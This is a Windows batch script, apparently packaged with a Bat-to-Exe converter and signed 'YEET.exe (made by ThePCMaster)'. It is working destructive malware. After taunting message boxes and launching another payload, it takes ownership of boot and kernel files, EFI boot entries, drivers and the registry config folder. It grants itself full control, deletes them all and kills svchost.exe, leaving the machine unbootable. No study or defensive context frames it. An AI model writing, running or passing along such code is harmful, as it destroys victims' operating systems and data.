::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFC9cSTShEWqpErAO1O/v09Oih3lTUfo6GA==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
@echo off
echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMaster)")>yt.vbs
wscript yt.vbs
taskkill /f /im YEET.exe
del %userprofile%\Desktop\YEET.* /f
echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
wscript yt.vbs
%userprofile%\Desktop\Payloads\winpayl1.exe
cd C:\Windows\System32
mountvol W: /s
takeown /f hal.dll
takeown /f winload.efi
takeown /f winload.exe
takeown /f drivers /r /d y
takeown /f Boot /r /d y
takeown /f ..\Boot /r /d y
takeown /f W:\EFI\Boot\bootx64.efi
takeown /f W:\EFI\Microsoft\Boot\BCD
takeown /f ntoskrnl.exe
takeown /f config /r /d y
icacls hal.dll /grant %username%:F
icacls winload.efi /grant %username%:F
icacls winload.exe /grant %username%:F
echo y|cacls drivers /g %username%:F /t
echo y|cacls Boot /g %username%:F /t
echo y|cacls ..\Boot /g %username%:F /t
icacls W:\EFI\Boot\bootx64.efi /grant %username%:F
icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
icacls ntoskrnl.exe /grant %username%:F
echo y|cacls config /g %username%:F /t
del hal.dll /f
del winload.efi /f
del winload.exe /f
rd drivers /s /q
rd Boot /s /q
rd ..\Boot /s /q
del W:\EFI\Boot\bootx64.efi /f
del W:\EFI\Microsoft\Boot\BCD /f
del ntoskrnl.exe /f
rd config /s /q
timeout /t 15 /nobreak
taskkill /f /im svchost.exe